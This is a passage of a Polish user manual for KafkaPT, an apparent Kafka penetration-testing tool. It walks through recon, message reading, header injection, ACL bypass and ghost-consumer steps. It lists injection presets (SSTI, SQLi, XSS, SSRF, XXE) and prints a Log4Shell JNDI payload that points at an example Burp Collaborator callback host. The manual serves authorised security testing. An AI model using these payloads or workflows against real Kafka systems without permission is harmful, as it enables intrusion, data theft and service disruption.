| **Broker** | Adres brokera. |
| **Topic** | Topik do publikowania. |
| **Message Key** | Opcjonalny klucz partycji. Kafka używa klucza do routowania wiadomości do stałej partycji. Zostaw puste dla losowego przypisania partycji. |
| **Payload Source** | `Manual JSON` — wpisujesz ładunek. `From Randomizer` — użyj zakładki RANDOMIZE do generowania losowego ładunku. `From Reader (replay)` — wklej wiadomość przechwycona w zakładce READ. |
| **Ignore schema** (checkbox) | Wyślij surowe bajty zamiast danych serializowanych Avro. |
| **Encoding** (gdy surowy) | `UTF-8`, `hex` lub `base64`. Mówi KafkaPT jak interpretować tekst surowego ładunku. |
| **Edytor ładunku** (duże pole tekstowe) | Wpisz lub wklej swój ładunek JSON tutaj. |
| **Sekcja [ KAFKA HEADERS ]** | HeadersWidget do wstrzykiwania nagłówków Kafka (patrz niżej). |
| **SEND MESSAGE** | Wysyła wiadomość(i). |
| **Repeat** (checkbox) | Gdy zaznaczone, wysyła wiadomość wielokrotnie. |
| **Repeat count** (licznik) | Liczba powtórzeń. |
| **Licznik wysłanych** | Pokazuje łączną liczbę pomyślnie wysłanych wiadomości w tej sesji. |

#### Sekcja nagłówków Kafka w SEND:

Widget injekcji nagłówków działa identycznie jak pod-zakładka ATTACK → HEADER INJECT. Użyj go aby dodać niestandardowe nagłówki do każdej wychodzącej wiadomości:
- Użyj listy **Preset** aby wypełnić typ ładunku.
- Użyj **+** / **−** aby dodawać lub usuwać wiersze nagłówków.

**Jak używać SEND:**

1. Wpisz Broker i Topic.
2. W edytorze ładunku wpisz JSON: `{"test": "kafkapt"}`.
3. Kliknij **SEND MESSAGE**.
4. Log dostarczenia poniżej pokazuje czy wiadomość została zaakceptowana przez brokera.
5. Aby dodać nagłówki: kliknij **+** w sekcji nagłówków, wpisz nazwę np. `X-Trace-ID` i wartość.
6. Aby testować Avro: najpierw wczytaj schemat w zakładce SCHEMA, a ładunek zostanie automatycznie serializowany przez Avro.

---

### 9.5 Zakładka RANDOMIZE

**Co to jest:** Przy testowaniu topików kodowanych Avro musisz wysyłać wiadomości zgodne ze schematem. Zakładka RANDOMIZE automatycznie generuje losowe prawidłowe dane dla dowolnego schematu Avro.

**Dlaczego przydatna:** Zamiast ręcznie tworzyć prawidłowy ładunek Avro, KafkaPT odczytuje załadowany schemat i generuje realistyczne losowe dane — przydatne do testów obciążeniowych, ataków powtórzeniowych i weryfikacji egzekwowania schematu.

#### Pola i przyciski:

| Pole / Przycisk | Co robi |
|---|---|
| **GENERATE RANDOM PAYLOAD** | Generuje jeden losowy prawidłowy ładunek JSON na podstawie schematu załadowanego w zakładce SCHEMA. |
| **COPY JSON** | Kopiuje wygenerowany JSON do schowka (do wklejenia ręcznie do zakładki SEND). |
| **CLEAR** | Czyści wyświetlany wygenerowany ładunek. |
| **Licznik generowań** | Pokazuje ile ładunków wygenerowano w tej sesji. |
| **Wyświetlacz ładunku** | Pokazuje wygenerowany JSON. |

**Obsługiwane typy Avro:**
Null, boolean, int, long, float, double, string, bytes, tablice, mapy, enumy, uniony, fixed i wszystkie typy logiczne (uuid, date, timestamps, decimal).

**Jak używać RANDOMIZE:**

1. Najpierw przejdź do zakładki **SCHEMA** i pobierz schemat (kliknij FETCH SCHEMA).
2. Wróć do zakładki **RANDOMIZE**.
3. Kliknij **GENERATE RANDOM PAYLOAD**. Pojawia się prawidłowy losowy JSON.
4. W zakładce **SEND** ustaw **Payload Source** na `From Randomizer`.
5. Kliknij **SEND MESSAGE** — KafkaPT generuje świeży losowy ładunek dla każdej wiadomości.

---

### 9.6 Zakładka FINDINGS

**Co to jest:** Za każdym razem gdy KafkaPT wykryje potencjalną podatność, automatycznie rejestruje **finding** tutaj. Finding ma poziom ważności, opis, dowód i timestamp. Na koniec testu eksportuj wszystkie findingi jako raport Markdown.

#### Poziomy ważności:

| Ważność | Kolor | Znaczenie |
|---|---|---|
| **CRITICAL** | Czerwony | Natychmiastowe poważne ryzyko. Bypass ACL, wildcard ACLe, skradzione wiadomości grupy konsumentów. |
| **HIGH** | Pomarańczowy | Znaczące ryzyko. PII w plaintext, udana dostawa injekcji, manipulacja offsetami. |
| **MEDIUM** | Żółty | Umiarkowane ryzyko. Ujawnienie wrażliwych danych, potencjalnie niebezpieczna konfiguracja. |
| **LOW** | Zielony | Drobne problemy. Informacyjne ujawnienie z ograniczonym wpływem. |
| **INFO** | Morski | Obserwacje. Odkryte topiki, enumerowane grupy, znalezione schematy. |

#### Pola i przyciski:

| Pole / Przycisk | Co robi |
|---|---|
| **Licznik findingów** | Pokazuje łączną liczbę findingów nagromadzonych w tej sesji. |
| **MARK FALSE POSITIVE** | Oznacza wybrany finding jako false positive. Pozostaje na liście ale jest oznaczony jako FP w eksportach. |
| **EXPORT MARKDOWN** | Zapisuje wszystkie findingi do pliku `.md`, posortowane według ważności. |
| **CLEAR ALL** | Trwale usuwa wszystkie findingi (z potwierdzeniem). |
| **Lista findingów** (lewy panel) | Pokazuje wszystkie findingi posortowane według ważności. Kolumny: Ważność, Tytuł, Faza (recon/authz/injection/data), Godzina. |
| **Widok szczegółów** (prawy panel) | Pełne szczegóły wybranego findingu: ważność, tytuł, faza, timestamp, opis i dowód. |

**Automatycznie generowane findingi:**

KafkaPT tworzy findingi automatycznie gdy:
- Topiki są widoczne przez RECON → INFO
- Grupy konsumentów są widoczne → INFO
- Schematy znalezione przez enumerację → INFO
- Wildcard ACL (`User:*`) wykryty → CRITICAL
- PII lub poświadczenia znalezione w wiadomości → HIGH
- Ładunek injekcji dostarczony → HIGH
- Bypass ACL odczytu lub zapisu → CRITICAL
- Ghost consumer dołącza i odbiera wiadomości → CRITICAL
- Reset offsetu się powiedzie → HIGH

---

## 10. Typowy przebieg testu penetracyjnego

Oto zalecana kolejność dla pentestów Kafka używając KafkaPT:

### Faza 1 — Konfiguracja

1. Otwórz KafkaPT.
2. Przejdź do zakładki **CERTIFICATES**. Włącz mTLS dla brokera (i SR jeśli potrzeba). Wczytaj pliki certyfikatów.
3. Przejdź do zakładki **PROXY / BURP**. Włącz proxy, wpisz URL Burpa. Wpisz URL Collaboratora.
4. Przejdź do zakładki **SCHEMA**. Wpisz URL Schema Registry.

### Faza 2 — Rozpoznanie

5. Przejdź do zakładki **RECON**. Wpisz adres brokera. Kliknij **RUN ALL**.
6. Zanotuj topiki w pod-zakładce **TOPOLOGY**.
7. Zanotuj ID grup konsumentów w pod-zakładce **GROUPS**.
8. Sprawdź pod-zakładkę **ACLS** pod kątem czerwonych wpisów (wildcard).
9. Przejdź do zakładki **SCHEMA**. Wpisz Schema ID `1`, kliknij **FETCH SCHEMA**. Spróbuj ID 1–5. Ustaw zakres enum 1–200 i kliknij **ENUMERATE**.

### Faza 3 — Testowanie bezpieczeństwa danych

10. Przejdź do zakładki **READ**. Wpisz broker, topik (z kroku 6), grupę `kafkapt-consumer`.
11. Ustaw offset na `earliest`, max wiadomości na `20`. Kliknij **READ MESSAGE(S)**.
12. Przejrzyj wiadomości w panelu szczegółów pod kątem wrażliwej zawartości.
13. Kliknij **EXPORT NDJSON** aby zapisać przechwycone wiadomości jako dowód.

### Faza 4 — Testowanie injekcji

14. Przejdź do **ATTACK → HEADER INJECT**. Wpisz broker i topik, do którego możesz pisać.
15. Kliknij **+**, zostaw nazwę jako `X-Correlation-ID`.
16. Z listy Preset wybierz `Log4Shell — JNDI/LDAP`.
17. Zweryfikuj że Twój URL Collaboratora został podstawiony w kolumnie wartości.
18. Kliknij **INJECT**.
19. Monitoruj Burp Collaboratora pod kątem callbacków (czekaj 60 sekund).
20. Powtórz dla innych nagłówków (`User-Agent`, `X-Forwarded-For`) i innych presetów.

### Faza 5 — Testowanie autoryzacji

21. Przejdź do **ATTACK → ACL BYPASS**. Wpisz broker.
22. W **Target topic** wpisz topik z RECON, do którego *nie powinieneś* mieć dostępu.
23. Kliknij **TEST READ**. Zanotuj wynik.
24. Kliknij **TEST WRITE**. Zanotuj wynik.
25. Wpisz ID grupy konsumentów z RECON w **Ghost group ID**.
26. Kliknij **GHOST JOIN** (potwierdź dialog).

### Faza 6 — Raport

27. Przejdź do zakładki **FINDINGS**.
28. Przejrzyj wszystkie findingi. Oznacz false positives.
29. Kliknij **EXPORT MARKDOWN** aby wygenerować raport.

---

## 11. Opis presetów injekcji

| Nazwa presetu | Typ ataku | Co testuje |
|---|---|---|
| `Log4Shell — JNDI/LDAP` | Zdalne wykonanie kodu | Czy Log4j2 przetwarza nagłówek i wykonuje wychodzące żądanie LDAP |
| `Log4Shell — JNDI/RMI` | Zdalne wykonanie kodu | To samo ale przez protokół RMI |
| `Log4Shell — JNDI/DNS` | Callback DNS | Prostszy test Log4Shell — tylko lookup DNS |
| `SSTI — Jinja2` | Injekcja szablonów po stronie serwera | Czy silnik szablonów Jinja2 ewaluuje `{{7*7}}` |
| `SSTI — FreeMarker` | Injekcja szablonów | Czy FreeMarker ewaluuje `${7*7}` |
| `SQLi — Error-based` | Injekcja SQL | Czy wartość dociera do bazy danych i powoduje błąd |
| `SQLi — Union` | Injekcja SQL | Próba ekstrakcji danych przez union |
| `XSS — Script tag` | Cross-site scripting | Czy wartość nagłówka jest odbijana w interfejsie webowym bez sanityzacji |
| `XSS — Img onerror` | Cross-site scripting | Alternatywny XSS przez obsługę błędu obrazu |
| `Command Injection` | Injekcja poleceń OS | Czy wartość jest przekazywana do powłoki |
| `Path Traversal` | Przemierzanie katalogów | Czy wartość dociera do systemu plików |
| `SSRF — AWS metadata` | SSRF po stronie serwera | Czy serwer przetwarzający pobiera metadane wewnętrzne AWS |
| `SSRF — Internal` | SSRF | Czy wewnętrzny aktuator Spring Boot jest dostępny |
| `XXE` | Zewnętrzna jednostka XML | Czy parser XML przetwarza zewnętrzne encje |
| `Null byte` | Sanityzacja wejść | Czy bajty null powodują nieoczekiwane zachowanie |
| `Large value (1 KB)` | Przepełnienie bufora / DoS | Czy wartość nagłówka 1 KB powoduje błędy |

**Jak działa placeholder `COLLAB`:**

Gdy ustawisz URL Collaboratora w zakładce PROXY/BURP (np. `abc123.oastify.com`) i zastosujesz preset Log4Shell, `COLLAB` jest zastępowane Twoim URL-em:

```
${jndi:ldap://COLLAB/a}  →  ${jndi:ldap://abc123.oastify.com/a}
```

Oznacza to że każdy callback z docelowego systemu pojawi się w Burp Collaboratorze, potwierdzając podatność.

---

## 12. Rozumienie findingów

Każdy finding ma następujące pola:

- **Severity (Ważność)** — Jak poważny jest problem (CRITICAL → INFO).
- **Title (Tytuł)** — Krótki opis co zostało znalezione.
- **Phase (Faza)** — Która część pentestów znalazła finding: `recon`, `authz`, `injection`, `data`, `infra`.
- **Time (Czas)** — Timestamp UTC kiedy finding został zarejestrowany.
- **Description (Opis)** — Pełne wyjaśnienie problemu i jego implikacji.
- **Evidence (Dowód)** — Surowe dane potwierdzające finding (przechwycona zawartość wiadomości, nazwa topiku, offset itp.).

### Co robić z findingami

| Ważność | Zalecane działanie |
|---|---|
| CRITICAL | Raportuj natychmiast. Wstrzymaj testy do czasu powiadomienia właściciela systemu. |
| HIGH | Umieść prominentnie w raporcie. Wymaga natychmiastowej remediacji. |
| MEDIUM | Umieść w raporcie. Powinien być naprawiony w następnym sprincie. |
| LOW | Umieść w raporcie. Zaplanuj remediację. |
| INFO | Umieść jako kontekst informacyjny. Samo w sobie nie jest podatnością. |

---

## 13. Eksport wyników

### Eksport findingów jako Markdown

1. Przejdź do zakładki **FINDINGS**.
2. Kliknij **EXPORT MARKDOWN**.
3. Wybierz lokalizację zapisu.
4. Plik `.md` jest posortowany według ważności, z pełnymi opisami i dowodami dla każdego findingu.

### Eksport wiadomości jako NDJSON

1. Przejdź do zakładki **READ** po skonsumowaniu wiadomości.
2. Kliknij **EXPORT NDJSON**.
3. Wybierz lokalizację zapisu.
4. Każda linia w pliku to obiekt JSON zawierający: topik, partycję, offset, timestamp, nagłówki, zdekodowaną wartość i surowy hex.

---

## 14. Rozwiązywanie problemów

### „confluent-kafka not installed"
```bash
pip install confluent-kafka
```

### „fastavro not installed"
```bash
pip install fastavro
```

### Nie można połączyć się z brokerem

- Sprawdź że adres brokera jest poprawny (włącznie z portem).
- Dla mTLS: zweryfikuj że wszystkie trzy pliki certyfikatów są wybrane i ścieżki są poprawne.
- Spróbuj odznaczić **Verify server certificate** jeśli używasz certyfikatów samopodpisanych.
- Upewnij się że Twoje IP ma dostęp do brokera (reguły firewalla).

### Pobieranie schematu zwraca HTTP 404

- Schema ID nie istnieje. Spróbuj ID `1`, `2` itp.
- Spróbuj funkcji **ENUMERATE** aby znaleźć które ID istnieją.

### RECON nie pokazuje topików

- Twój certyfikat może nie mieć uprawnienia `DESCRIBE` dla żadnych topików.
- Samo w sobie warto to odnotować: sprawdź czy błąd mówi „TOPIC_AUTHORIZATION_FAILED".

### Proxy Burpa nie działa

- Upewnij się że Burp jest uruchomiony i jego listener Proxy jest włączony.
- Sprawdź że port w Burpie zgadza się z portem w KafkaPT (domyślnie: 8080).
- Kliknij przycisk **TEST** w zakładce PROXY/BURP aby zdiagnozować problem.

### Wiadomości pojawiają się jako hex / binarny

- Najpierw wczytaj właściwy schemat w zakładce SCHEMA.
- Lub zaznacz **Ignore schema** i ustaw **Display as** na `auto-detect` albo `UTF-8 raw`.

### Błąd wersji Pythona

KafkaPT wymaga Python 3.11+. Sprawdź:
```bash
python3 --version
```

---

## 15. Zastrzeżenie prawne

**To narzędzie jest dostarczone wyłącznie do autoryzowanych testów bezpieczeństwa i badań.**

- Musisz mieć **jawne pisemne pozwolenie** od właściciela systemu zanim zaczniesz testować jakiekolwiek środowisko Kafka tym narzędziem.
- Nieautoryzowany dostęp do systemów komputerowych jest nielegalny w większości jurysdykcji (np. Ustawa o Cyberbezpieczeństwie w Polsce, Computer Fraud and Abuse Act w USA, Computer Misuse Act w Wielkiej Brytanii).
- Autorzy KafkaPT nie ponoszą żadnej odpowiedzialności za nieautoryzowane lub nielegalne użycie tego oprogramowania.
- Zawsze działaj w ramach uzgodnionego zakresu zlecenia testów penetracyjnych.
- Funkcje OFFSET ATTACK i GHOST JOIN mogą zakłócać działanie serwisów produkcyjnych. Używaj wyłącznie w izolowanych środowiskach testowych lub z jawną autoryzacją.

**Używaj odpowiedzialnie. Testuj etycznie.**

---

*KafkaPT v2.0 — opracowany dla społeczności badaczy bezpieczeństwa.*
